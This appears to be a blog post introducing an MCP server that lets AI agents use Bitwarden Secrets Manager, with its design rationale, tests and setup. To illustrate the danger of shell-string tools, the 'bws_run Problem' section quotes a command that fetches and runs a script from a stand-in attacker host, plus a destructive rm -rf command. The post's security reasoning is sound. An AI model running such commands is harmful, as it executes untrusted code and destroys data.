@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Giving Your AI Agent a Real Key to the Vault | blog.crawley.systems</title>
+  <meta name="description" content="An open-source MCP server that wraps Bitwarden Secrets Manager, giving Claude, Hermes, and every other agent in your homelab a controlled, audited path to read and write secrets — without defaulting to sh -c or leaking them through the LLM's context.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=JetBrains+Mono:wght@300;400;500;600&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+
+  <nav class="nav" id="nav">
+    <div class="nav__inner">
+      <a href="/" class="nav__logo">
+        <span class="nav__logo-bracket">[</span>blog<span class="nav__logo-dot">.</span>crawley<span class="nav__logo-dot">.</span>systems<span class="nav__logo-bracket">]</span>
+      </a>
+      <div class="nav__links">
+        <a href="https://crawley.systems">Home</a>
+        <a href="https://github.com/kvncrw" target="_blank" rel="noopener">GitHub</a>
+      </div>
+    </div>
+  </nav>
+
+  <section class="article-hero">
+    <div class="hero__grid-bg"></div>
+    <div class="hero__noise"></div>
+    <div class="article-hero__inner">
+      <a href="/" class="article-hero__back">&larr; All articles</a>
+      <div class="article-hero__meta">
+        <span class="post-card__date">2026-04-10</span>
+        <span class="post-card__tags">
+          <span class="tag">security</span>
+          <span class="tag">mcp</span>
+          <span class="tag">bitwarden</span>
+          <span class="tag">ai-agents</span>
+          <span class="tag">open-source</span>
+        </span>
+      </div>
+      <h1 class="article-hero__title">Giving Your AI Agent a Real Key to the Vault</h1>
+      <p class="article-hero__subtitle">A new open-source MCP server that wraps Bitwarden Secrets Manager, so Claude (or Hermes, or whoever's driving your homelab this week) gets a controlled, audited path to read and write secrets — without you teaching it how to eval shell strings.</p>
+    </div>
+  </section>
+
+  <article class="article-body">
+    <div class="article-body__inner">
+
+      <p>Two weeks ago I wrote about <a href="/posts/litellm-supply-chain-attack.html">the LiteLLM PyPI compromise</a> and made what I think is the correct argument: the fix for filesystem credential harvesters is ephemeral secrets that never land as files. Don't put your database URL in <code>~/.env</code>. Don't shove it into <code>~/.aws/credentials</code>. Use the Secrets Store CSI Driver, fetch it into the pod at startup via tmpfs, and let the secret live exactly long enough to be read into the process that needs it.</p>
+
+      <p>Then I spent the next week using Claude Code to manage my homelab and realized the post was only half the answer.</p>
+
+      <p>Here's the other half. If your premise is "secrets should live in a vault and only materialize at the last possible moment," you've now created a new question: <em>how does the thing that needs the secret ask the vault for it?</em> For a running pod, the CSI driver answers that: it mounts a tmpfs at <code>/mnt/secrets</code> and your app reads from there. For a CI job, <code>bws run -- ./deploy.sh</code> answers it: the secrets show up as environment variables for exactly one child process. Both of those have clean, well-understood semantics.</p>
+
+      <p>But what about the AI agent you've been using to actually run your infrastructure? The one you just told "spin up a new test project in BSM and create a <code>DB_URL</code> secret in it"? How does <em>that</em> ask the vault?</p>
+
+      <p>Today that's a mess. There's no good path. Your options, roughly:</p>
+
+      <ul>
+        <li><strong>Dump secrets into the agent's shell</strong> via <code>env</code> before you start the session. Now every command the agent runs has access to everything. Blast radius: everything the token can touch. If the agent tool-calls a subprocess that logs its environment, your secrets go to the LLM provider's logs.</li>
+        <li><strong>Pre-materialize a <code>.env</code> file</strong> the agent can read. Same problem, worse, because now there's a persistent flat file sitting on disk — exactly the thing the litellm payload vacuumed up.</li>
+        <li><strong>Tell the agent to shell out to <code>bws</code> directly</strong>, via a generic "run a terminal command" tool. Now you've given the LLM an eval primitive into your secrets CLI and you're relying on prompt engineering to keep it from doing something stupid. Works until it doesn't.</li>
+        <li><strong>Build a custom per-secret integration</strong> for every agent platform you use. Ridiculous, doesn't scale, I refuse.</li>
+      </ul>
+
+      <p>The Model Context Protocol is supposed to be the answer to this class of problem. And it nearly is — the official <a href="https://github.com/bitwarden/mcp-server" target="_blank" rel="noopener">bitwarden/mcp-server</a> wraps Bitwarden's <em>password manager</em> vault in an MCP, so Claude Desktop can retrieve saved logins for you. Which is great for personal passwords. But Bitwarden has two distinct vaults — the consumer password manager (<code>bw</code>) and the server-side Secrets Manager (<code>bws</code>) — and the official MCP only covers the first one. For the homelab and infrastructure use case, which is the whole reason I run Bitwarden Secrets Manager in the first place, there's no MCP at all.</p>
+
+      <p>So I wrote one. It's called <a href="https://github.com/kvncrw/bws-mcp-server" target="_blank" rel="noopener">bws-mcp-server</a>, it's on GitHub under GPL-3.0, and this post walks through what it does, the design decisions that made it (two of which I had to learn the hard way during the build), and why the test suite was the most interesting part of the project.</p>
+
+      <figure class="article-figure">
+        <img src="../bws-mcp-vault-hero.png" alt="A symmetrical cyberpunk vault corridor: two walls of sealed steel lockers flanking a wet reflective concrete floor, teal spotlights from the ceiling, a single sealed door at the far vanishing point." />
+      </figure>
+
+      <h2>What It Actually Does</h2>
+
+      <p>bws-mcp-server exposes twelve tools over the MCP stdio protocol. All of them are thin wrappers around the real <code>bws</code> CLI binary (more on that choice in a minute). They fall into four buckets:</p>
+
+      <ul>
+        <li><strong>Status</strong> — <code>bws_status</code> checks that the <code>bws</code> binary is reachable, the access token is valid, and the API is up. This is the first thing I want the agent to be able to answer: "can I even talk to the vault right now?"</li>
+        <li><strong>Projects (CRUD)</strong> — <code>bws_project_list</code>, <code>bws_project_get</code>, <code>bws_project_create</code>, <code>bws_project_edit</code>, <code>bws_project_delete</code>. One-to-one mapping with <code>bws project</code> subcommands. Projects are how BSM scopes secrets; each machine account token is granted access to a set of projects with either read or read-write permissions.</li>
+        <li><strong>Secrets (CRUD)</strong> — <code>bws_secret_list</code>, <code>bws_secret_get</code>, <code>bws_secret_create</code>, <code>bws_secret_edit</code>, <code>bws_secret_delete</code>. Same shape. <code>bws_secret_list</code> is the one you'll use constantly — it returns keys and IDs only by default. You have to explicitly pass <code>include_values: true</code> to get the actual secret values, which keeps the agent's default behavior from accidentally dumping the entire vault into the LLM's context on a vague "what secrets do I have?" prompt.</li>
+        <li><strong>Execution</strong> — <code>bws_run</code> invokes a command with project secrets injected as environment variables, mirroring <code>bws run</code>. This is the powerful one, and it's the tool I spent the most time thinking about. I'll come back to it.</li>
+      </ul>
+
+      <p>Three tools are marked destructive and gated behind a mandatory <code>confirm: true</code> parameter: <code>bws_project_delete</code>, <code>bws_secret_delete</code>, and <code>bws_run</code>. If the agent calls one of these without explicitly setting <code>confirm</code>, the handler short-circuits with a structured error before any validation or subprocess work happens. This is the same pattern the upstream <code>bitwarden/mcp-server</code> uses for vault deletes, and it's the only pattern I've found that plays well with both Claude Desktop's human-in-the-loop approval UI and the more autonomous agent runtimes like Hermes that do their own policy gating.</p>
+
+      <p>Is a <code>confirm: true</code> flag a safety net? No. The model can absolutely set it to true if you tell it to. It's a <em>policy gate</em> — a mechanism to force the destructive intent to the surface on every single call, so your approval tooling has something to hook into. The alternative is having to pattern-match tool call arguments to figure out which calls are dangerous, and that's a rabbit hole I'd rather not start digging.</p>
+
+      <h2>Wrapping the CLI, Not the SDK</h2>
+
+      <p>Bitwarden publishes an <a href="https://github.com/bitwarden/sdk-sm" target="_blank" rel="noopener">official Rust SDK for Secrets Manager</a>, with bindings for Python, Node.js, Go, and a handful of other languages. In theory you'd pull in the Node SDK and call it directly from the MCP server. I went a different direction: <code>bws-mcp-server</code> shells out to the <code>bws</code> CLI binary via <code>child_process.spawn</code>, parses the JSON output, and surfaces the results to the MCP caller.</p>
+
+      <p>This is the less fashionable choice, and I want to explain why I made it.</p>
+
+      <p>First, <strong>the CLI is what actually ships</strong>. The bws team treats the command-line binary as a first-class product. New features show up in <code>bws</code> before they're stabilized in any SDK. Bug fixes land in the CLI on the same release cadence as the API. If I wrap the CLI, I get those fixes automatically the next time the user upgrades their binary. If I wrap the Rust SDK via Node FFI, I'm pinned to whatever version I built against and the user has to wait for me to cut a new release.</p>
+
+      <p>Second, <strong>the CLI is the source of truth for argv shape</strong>. BSM has some genuinely unusual conventions — <code>bws secret create</code> takes positional arguments in the order <code>KEY VALUE PROJECT_ID</code>, with optional <code>--note</code>, and this is documented only in the CLI's <code>--help</code> output. The SDK abstracts that away into a method signature, which is fine until you need to debug an invocation and the SDK method doesn't print the actual argv it's about to run. I wanted the MCP server to be transparent: when it calls out to <code>bws</code>, the command it runs looks exactly like what you'd type into a shell. That makes debugging, logging, and auditing trivial. You can take the server's debug output, paste it into a terminal, and get the same result.</p>
+
+      <p>Third, and this is the honest one, <strong>spawning a subprocess is fifty lines of code and the SDK path is a week of yak-shaving</strong>. I wanted v0.1.0 shipped today, not in three weeks. Wrapping the CLI means the MCP server is about 600 lines of TypeScript, most of which is tool schemas and input validation. There's one file — <code>src/bws/client.ts</code> — that handles all the subprocess work, and it's under 200 lines.</p>
+
+      <p>The downside is real. If the user's <code>bws</code> binary isn't installed, or isn't on <code>PATH</code>, or is a different version than expected, the server has to handle that gracefully. I ended up adding a <code>BWS_BINARY</code> environment variable override so you can point at any binary you want (useful if you have multiple versions installed), and a <code>bws_status</code> tool that explicitly reports the version it's talking to. If someone wants to rewrite the client layer against the SDK later, the tool surface won't change — the swap is localized to <code>client.ts</code>.</p>
+
+      <h2>The <code>bws_run</code> Problem</h2>
+
+      <p><code>bws_run</code> is the most powerful tool in the set, and it's the one I rewrote twice during the build. The first version looked like this:</p>
+
+      <pre><code><span class="code-label">src/tools/run.ts (first draft)</span>
+inputSchema: {
+  command: { type: 'string', description: 'Shell command to execute' },
+  project_id: { type: 'string' },
+  confirm: { type: 'boolean' },
+}
+
+// handler
+const result = await spawnBws(config, [
+  'run', '--project-id', projectId, '--', 'sh', '-c', command,
+]);</code></pre>
+
+      <p>That's the naive shape. The agent passes a string like <code>"psql -c 'SELECT count(*) FROM users'"</code>, the server wraps it in <code>sh -c</code>, <code>bws</code> launches the child with the secrets injected, and the agent gets back stdout, stderr, and exit code. Clean, simple, matches what most humans do at the command line.</p>
+
+      <p>It's also a remote code execution primitive into your homelab the moment you let an LLM call it.</p>
+
+      <p>Here's the problem. An MCP tool that accepts a free-form shell string and pipes it to <code>sh -c</code> is, by definition, an eval surface. The agent can construct <em>any command</em>, nested pipes, subshells, process substitution, redirections, glob expansion, command substitution — all of it — and hand it to you. You then execute it with a process environment populated from your secrets vault. The access token doesn't need to authorize anything clever; the agent already has <code>sh</code>.</p>
+
+      <p>That's bad for two reasons that I want to separate carefully.</p>
+
+      <p>The first reason is the obvious one: <strong>if the agent makes a bad call, the blast radius is the entire Unix userland</strong>. <code>rm -rf ~/projects</code> is a valid shell command. <code>curl evil.example.com/x.sh | sh</code> is a valid shell command. If the model hallucinates a plausible-looking incantation, or if an upstream input gets prompt-injected, or if the system prompt gets stripped off mid-conversation, you're one <code>tools/call</code> away from a bad day.</p>
+
+      <p>The second reason is less obvious but more annoying: <strong>portability</strong>. On Debian, <code>/bin/sh</code> is dash. On Arch and macOS, it's bash. On Alpine, it's busybox ash. On FreeBSD, it's a different bash. Each of these handles quoting, expansion, and builtin behavior differently. I found this out the hard way when my integration test suite passed locally (where <code>/bin/sh</code> is bash and happened to slurp up some exported functions from my shell profile) and then failed in a fresh GitHub Actions Ubuntu runner (where <code>/bin/sh</code> is dash and doesn't do that). Then it failed <em>again</em> locally when I ran it from a different shell. The tests weren't broken; the shell under <code>sh -c</code> was just different every time.</p>
+
+      <p>The fix was to get rid of the shell entirely. <code>bws_run</code> now takes an explicit <code>argv</code> array:</p>
+
+      <pre><code><span class="code-label">src/tools/run.ts (shipped)</span>
+inputSchema: {
+  argv: {
+    type: 'array',
+    items: { type: 'string' },
+    minItems: 1,
+    description: 'Argv array: program followed by arguments. No shell.',
+  },
+  project_id: { type: 'string' },
+  no_inherit_env: { type: 'boolean' },
+  confirm: { type: 'boolean' },
+}
+
+// handler
+const result = await runWithSecrets(config, {
+  argv: parsed.argv,   // forwarded directly to bws run --
+  projectId: parsed.project_id,
+});</code></pre>
+
+      <p>The argv is forwarded directly to <code>bws run -- &lt;argv...&gt;</code>, which <code>exec()</code>s the program with the secrets in its environment. No shell, no eval, no <code>sh -c</code>. If the agent wants to run <code>psql -c 'SELECT count(*) FROM users'</code>, it has to pass the argv array: <code>["psql", "-c", "SELECT count(*) FROM users"]</code>. The parts are explicit, the shell has no opinion about them, and the model has to structure its intent in a way that's actually auditable.</p>
+
+      <p>The <em>really</em> nice property is that you can still run a shell pipeline when you genuinely need one. You just have to ask for it explicitly, by name:</p>
+
+      <pre><code><span class="code-label">Shell pipeline, caller opts in</span>
+{
+  "argv": ["sh", "-c", "kubectl get pods -o json | jq '.items | length'"],
+  "project_id": "staging",
+  "confirm": true
+}</code></pre>
+
+      <p>This reads very differently from the old shape. Instead of an implicit shell that might be dash, bash, or ash depending on the host, the caller is saying "launch <code>sh</code> as a program, pass it these exact arguments." That's a normal program invocation. It still pipes a command to the shell, and that's still dangerous, but now it's obvious in the argv that you're doing it. If your approval policy says "reject any <code>bws_run</code> whose argv[0] is <code>sh</code>", you can enforce that with two lines of code.</p>
+
+      <p>This was the most important design change in the project, and it only happened because I was staring at a failing integration test with a printf error that made no sense in context.</p>
+
+      <figure class="article-figure">
+        <img src="../bws-mcp-handoff.png" alt="Extreme macro of a polished chrome robotic hand cupping a single glowing cyan crystal key on a dark smoky background. Symbolic: the agent being handed a credential, not taking one." />
+      </figure>
+
+      <h2>Why the Tests Are the Story</h2>
+
+      <p>The test suite is the interesting part of this project, and if you're going to steal one idea from this post, steal this one: <strong>if you're building a thing that wraps another thing, and you don't test against the real wrapped thing, your tests are a lie</strong>.</p>
+
+      <p>I have a hard rule on this, and it shows up in everything I write now: no mocks. No <code>jest.mock</code>, no sinon, no nock, no Wiremock. When a test says "the parser handles a non-JSON response," the test has to produce an actual non-JSON response from an actual subprocess. When a test says "deleting a project via the real <code>bws</code> binary works," the test has to create a real project in a real Bitwarden Secrets Manager backend, delete it, and confirm it's gone. Anything less is a test of my <em>beliefs</em> about how the dependency behaves, and my beliefs have been wrong often enough that I've stopped trusting them.</p>
+
+      <p>bws-mcp-server has three test tiers, in increasing order of how much real-world friction they exercise:</p>
+
+      <ol>
+        <li><strong>Unit tests</strong> (<code>tests/unit/</code>) — pure functions only. Argv builders, stdout parsers, schema validation, error mapping, env loading. Zero external dependencies, run in about a second, always green for any contributor. These are fine, they just don't catch much.</li>
+        <li><strong>Protocol E2E tests</strong> (<code>tests/protocol/</code>) — spawn the actual built MCP server as a subprocess, send real JSON-RPC messages over stdio, assert on the responses. The tricky part is that the server shells out to <code>bws</code>, and the GitHub Actions runner doesn't have <code>bws</code> installed. Solution: the test harness writes a small stub shell script named <code>bws</code> that echoes canned JSON for each subcommand, prepends its directory to <code>PATH</code>, and spawns the MCP server with that <code>PATH</code>. The server has no idea it's talking to a stub — it's a real <code>execve()</code> of a real binary that happens to behave predictably. This is not a mock. It's a controlled peer.</li>
+        <li><strong>Integration tests</strong> (<code>tests/integration/</code>) — exec the real <code>bws</code> binary against a real Bitwarden Secrets Manager project, create secrets and projects with unique prefixes per run, verify every round-trip (create → get → edit → list → delete), clean up in <code>afterEach</code>. Gated behind <code>BWS_ACCESS_TOKEN_TEST</code> and <code>BWS_TEST_PROJECT_ID</code> env vars. Contributors without a Bitwarden account see them skip with a clear log message; contributors with access run them; CI runs them against a dedicated test project on the main branch and on manual workflow dispatch.</li>
+      </ol>
+
+      <p>I shipped v0.1.0 with sixty-four unit and protocol tests passing. Then I ran the integration suite against a real BSM project for the first time. Three out of four tests failed, and they were the most useful thirty minutes of the entire project.</p>
+
+      <h3>Bug one: <code>bws secret delete</code> returns plain text</h3>
+
+      <p>My <code>runBwsJson</code> helper assumed that every <code>bws</code> command returned JSON on success. That's true for <code>list</code>, <code>get</code>, <code>create</code>, and <code>edit</code>. It is not true for <code>delete</code>. Delete returns a plain-text line:</p>
+
+      <pre><code><span class="code-label">bws secret delete output</span>
+$ bws secret delete 550e8400-e29b-41d4-a716-446655440000
+1 secret deleted successfully.</code></pre>
+
+      <p>My parser hit that text, tried to feed it to <code>JSON.parse</code>, and got:</p>
+
+      <pre><code><span class="code-label">test failure</span>
+BwsError: Failed to parse bws stdout as JSON:
+  Unexpected non-whitespace character after JSON at position 2.
+  Raw output: 1 secret deleted successfully.</code></pre>
+
+      <p>None of my unit tests caught this because the unit tests used controlled JSON fixtures. The protocol E2E tests didn't catch it either, because the stub shell script returned canned JSON for every command including delete — I had no reason to stub different output for different subcommands, and the stub wasn't modeling the real binary's behavior on that specific code path. I didn't find out that <code>delete</code> returns text until I watched the real binary do it.</p>
+
+      <p>The fix was a three-line change: detect if the trimmed stdout starts with <code>{</code> or <code>[</code>, and if it doesn't, return <code>null</code> instead of trying to parse. Callers of <code>delete</code> already rely on the exit code for success signaling, so a null return is the correct shape.</p>
+
+      <h3>Bug two: <code>sh -c</code> leaks your shell profile</h3>
+
+      <p>The second bug is the one I already described — the <code>sh -c</code> wrapper in the old <code>bws_run</code> was slurping up exported function definitions from my parent shell and wedging on a printf call. It only manifested in integration tests because those were the only tests that actually spawned <code>bws run</code> with real shell commands. Unit and protocol tests exercised the argv builder but never actually ran anything through the shell layer.</p>
+
+      <p>I fixed this by deleting the entire <code>sh -c</code> layer and making <code>bws_run</code> argv-only, as I described above. The bug went away, and so did an entire class of bugs I didn't know I had.</p>
+
+      <h3>Bug three: Bitwarden's Notes field has a 10,000 character limit</h3>
+
+      <p>This one isn't in the MCP server itself — it's in the <code>redact-history</code> tool I use to periodically scrub secrets from my AI chat transcripts. I mention it here because the debugging arc is identical.</p>
+
+      <p>I was adding a feature to push redaction findings into Bitwarden as a secure note before the script modifies any files, as a recovery tether. First attempt passed the encoded findings JSON as an <em>argv</em> to <code>bw create item</code>, which hit <code>ARG_MAX</code> on Linux (around 128KB of argv per process) the moment the findings got real. Fixed that by piping via stdin. Second attempt ran into the Bitwarden Notes field limit: 10,000 encrypted characters, max, period. I had 1,700 findings; the serialized JSON was about 400KB. Bitwarden refused it.</p>
+
+      <p>The fix was to use Bitwarden's <em>attachment</em> feature instead: create a tiny secure note containing a summary (counts by pattern, by source, timestamp), then attach the full JSON as a file on the same item. Attachments don't have the same size limit. This is the right shape anyway — the summary is human-readable for triage, and the full data is exactly one <code>bw get attachment</code> away when you need to recover something.</p>
+
+      <p>None of these three bugs would have been caught by mocked tests. They only surfaced because the tests exercised the real dependency. Every mock I didn't write is a bug I caught before release instead of after.</p>
+
+      <figure class="article-figure">
+        <img src="../bws-mcp-audit-trail.png" alt="Silhouette of a figure from behind facing a floor-to-ceiling wall of cascading teal and amber data columns with abstract glyph blocks." />
+      </figure>
+
+      <h2>Setup</h2>
+
+      <p>Three steps: install the <code>bws</code> CLI, get a machine token, wire the MCP into your agent runtime.</p>
+
+      <h3>1. Install <code>bws</code></h3>
+
+      <p>The <code>bws-mcp-server</code> doesn't ship with the Bitwarden CLI — it uses whatever's on your <code>PATH</code>. Install it from <a href="https://bitwarden.com/help/secrets-manager-cli/" target="_blank" rel="noopener">Bitwarden's official instructions</a> or via your package manager. On Arch, it's in the AUR:</p>
+
+      <pre><code><span class="code-label">bws install</span>
+yay -S --noconfirm bws
+bws --version</code></pre>
+
+      <p>On macOS, <code>brew install bitwarden-secrets-manager</code>. On Debian/Ubuntu, grab the binary from the latest GitHub release.</p>
+
+      <h3>2. Create a machine account and issue a token</h3>
+
+      <p>This part is a one-time manual step because Bitwarden doesn't let you create access tokens via the CLI (it'd defeat the purpose — you'd have to bootstrap a credential to create a credential). Go to <a href="https://vault.bitwarden.com/#/sm/machine-accounts" target="_blank" rel="noopener">vault.bitwarden.com → Secrets Manager → Machine Accounts</a>, create a new machine account, <strong>grant it explicit project access</strong> (this is the gotcha — a machine account with no projects granted can authenticate but sees zero secrets), and issue an access token. The token appears exactly once. Copy it.</p>
+
+      <h3>3. Install the MCP server</h3>
+
+      <p>For a hermes-agent, Claude Code, or Claude Desktop setup, point at the published npm package (coming shortly) or run it from source:</p>
+
+      <pre><code><span class="code-label">Claude Desktop config</span>
+{
+  "mcpServers": {
+    "bws": {
+      "command": "npx",
+      "args": ["-y", "@kvncrw/bws-mcp-server"],
+      "env": {
+        "BWS_ACCESS_TOKEN": "0.xxx.yyy",
+        "BWS_DEFAULT_PROJECT_ID": "optional-uuid-if-you-want-one"
+      }
+    }
+  }
+}</code></pre>
+
+      <p>The <code>BWS_ACCESS_TOKEN</code> env var is the only required setting. Everything else (<code>BWS_SERVER_URL</code> for self-hosted Bitwarden, <code>BWS_BINARY</code> for a non-standard <code>bws</code> path, <code>BWS_DEFAULT_PROJECT_ID</code> for a convenience default) is optional.</p>
+
+      <p>Once it's wired up, restart your agent and ask it something like "what projects can you see in my Bitwarden Secrets Manager?" It'll call <code>bws_project_list</code> and come back with the list. From there, the agent can manage secrets autonomously within whatever scope you've granted the machine account.</p>
+
+      <h2>What's Missing</h2>
+
+      <p>This is a v0.1.0 release. It covers the working happy path for the core operations, and I've been using it in my homelab for real work this week. It is not feature-complete, and I want to be honest about the gaps rather than have you discover them.</p>
+
+      <ul>
+        <li><strong>No retry-with-backoff on transient BSM 5xx</strong>. Bitwarden's hosted API occasionally returns <code>500 Internal Server Error</code> on otherwise valid requests. The MCP server surfaces those straight to the caller right now. <a href="https://github.com/kvncrw/bws-mcp-server/issues/1" target="_blank" rel="noopener">Issue #1</a> tracks the fix.</li>
+        <li><strong>No streaming for <code>bws_run</code></strong>. Long-running commands buffer their output in memory until exit. Fine for one-shot queries (<code>psql -c</code>, <code>curl</code>, <code>kubectl get</code>), will wedge on anything long-lived like <code>terraform apply</code>. <a href="https://github.com/kvncrw/bws-mcp-server/issues/3" target="_blank" rel="noopener">Issue #3</a> tracks the design work for streaming via MCP progress notifications.</li>
+        <li><strong>Self-hosted Bitwarden (Vaultwarden) is untested</strong>. The <code>BWS_SERVER_URL</code> passthrough should work — it's forwarded as an environment variable to <code>bws</code> — but I don't have a Vaultwarden instance with Secrets Manager enabled, so I can't confirm it end-to-end. <a href="https://github.com/kvncrw/bws-mcp-server/issues/2" target="_blank" rel="noopener">Issue #2</a> is a call for someone in the self-hosted crowd to help me close the loop here.</li>
+      </ul>
+
+      <p>None of these are blocking for homelab or personal use. Most of them are the kind of rough edges you only feel when you scale up, and at that point you should be contributing the fix.</p>
+
+      <h2>Getting It</h2>
+
+      <p>Source code: <a href="https://github.com/kvncrw/bws-mcp-server" target="_blank" rel="noopener">github.com/kvncrw/bws-mcp-server</a>, GPL-3.0, issues and PRs welcome. The README walks through installation, configuration, and examples for Claude Desktop, Claude Code, and hermes-agent. There's a <code>docker/Dockerfile</code> if you want to run it in a container (Debian-based, never Alpine).</p>
+
+      <p>npm package: <code>@kvncrw/bws-mcp-server</code> — publishing shortly, watch the GitHub releases page.</p>
+
+      <p>If you find a bug, open an issue. If you fix a bug, open a PR. If you run it against a weird environment (self-hosted Bitwarden, Windows via WSL, a Synology box, whatever) and it breaks, <em>especially</em> open an issue — those are the reports that turn a useful homelab tool into a useful everywhere tool.</p>
+
+      <p>And if you're still handing your agent secrets via <code>.env</code> files: this is the graceful exit ramp.</p>
+
+      <figure class="article-figure">
+        <img src="../bws-mcp-gate.png" alt="Low-angle hero shot of an ornate brass-and-steel vault door in a cold stone corridor, combination dial and three deadbolts, red light leaking under the seam, teal overhead wash." />
+      </figure>
+
+      <hr>
+
+      <div class="article-author">
+        <div class="article-author__avatar">KC</div>
+        <div class="article-author__info">
+          <h4>Kevin Crawley</h4>
+          <p>Infrastructure engineer, <a href="https://crawley.systems">crawley.systems</a>. 20+ years building and operating production systems.</p>
+        </div>
+      </div>
+
+    </div>
+  </article>
+
+  <footer class="footer">
+    <div class="footer__inner">
+      <span class="footer__logo">
+        <span class="nav__logo-bracket">[</span>crawley<span class="nav__logo-dot">.</span>systems<span class="nav__logo-bracket">]</span>
+      </span>
+      <span class="footer__copy">&copy; 2026 Kevin Crawley. All rights reserved.</span>
+    </div>
+  </footer>
+
+  <script src="../main.js"></script>
+</body>
+</html>
